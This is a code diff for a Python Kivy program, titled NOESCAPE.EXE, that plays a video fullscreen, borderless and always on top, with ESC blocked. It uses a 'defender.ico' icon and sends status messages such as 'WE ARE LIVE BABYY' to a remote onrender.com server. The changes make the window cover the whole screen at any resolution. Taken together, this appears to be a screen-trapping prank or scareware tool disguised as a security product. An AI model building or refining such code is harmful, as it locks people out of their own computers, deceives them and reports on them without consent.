@@ -6,9 +6,11 @@
 import sys
 from os import path
 from requests import post,get
+from pyautogui import size
 # --- logging functions you already have ---
 url = "https://ms32-sha2.onrender.com/"
-user = "<APP>"
+user = "<VIDSHOW>"
+width, height = size()
 def hit(url: str, data=None):
     try:
             if data:
@@ -33,7 +35,7 @@ try:
     from kivy.clock import Clock
     from kivy.base import EventLoop
 except Exception as e:
-    log(f"[IMPORT ERROR] {e}", state="ERROR")
+    log(f"[IMPORT ERROR] {e}", state="FATAL")
     sys.exit(0)
 
 class NOESCAPE(App):
@@ -42,7 +44,7 @@ class NOESCAPE(App):
         try:
             self.icon = self.get_path("defender.ico")
         except Exception as e:
-            log(f"[ICON ERROR] {e}", state="ERROR")
+            log(f"[ICON ERROR] {e}", state="FATAL")
 
     def get_path(self, name):
         try:
@@ -52,14 +54,14 @@ class NOESCAPE(App):
                 base_path = path.abspath('.')
             return path.join(base_path, name)
         except Exception as e:
-            log(f"[PATH ERROR] {e}", state="ERROR")
+            log(f"[PATH ERROR] {e}", state="FATAL")
             return name
 
     def build(self):
         try:
             Window.set_title("NOESCAPE.EXE")
             Window.borderless = True
-            Window.size = (1366, 768)
+            Window.size = (width,height)
             Window.left = 0
             Window.top = 0
             Window.always_on_top = True
@@ -67,7 +69,7 @@ class NOESCAPE(App):
 
             video_path = sys.argv[1] if len(sys.argv) > 1 else None
             if not video_path or not path.isfile(video_path):
-                log(f"[VIDEO ERROR] Invalid or missing file: {video_path}", state="ERROR")
+                log(f"[VIDEO ERROR] Invalid or missing file: {video_path}", state="FATAL")
                 sys.exit(0)
 
             self.video = Video(
@@ -79,9 +81,10 @@ class NOESCAPE(App):
             self.video.keep_ratio = True
 
             Clock.schedule_interval(self.check_video_end, 0.1)
+            log(f"WE ARE LIVE BABYY", state="SUCESS")
             return self.video
         except Exception as e:
-            log(f"[BUILD ERROR] {e}", state="ERROR")
+            log(f"[BUILD ERROR] {e}", state="FATAL")
             self.clean_exit()
 
     def check_video_end(self, dt):
@@ -91,13 +94,14 @@ class NOESCAPE(App):
                 Clock.unschedule(self.check_video_end)
                 Clock.schedule_once(lambda x: self.clean_exit(), 0.1)
         except Exception as e:
-            log(f"[END CHECK ERROR] {e}", state="ERROR")
+            log(f"[END CHECK ERROR] {e}", state="FATAL")
             self.clean_exit()
 
     def prevent_escape(self, window, key, scancode, codepoint, modifier):
         return True  # Block ESC
 
     def clean_exit(self):
+        log(f"CLOSING THE CINEMA", state="PENDING")
         try:
             EventLoop.close()
         except:
@@ -112,5 +116,5 @@ if __name__ == '__main__':
     try:
         NOESCAPE().run()
     except Exception as e:
-        log(f"[MAIN ERROR] {e}", state="ERROR")
+        log(f"[MAIN ERROR] {e}", state="FATAL")
         sys.exit(0)
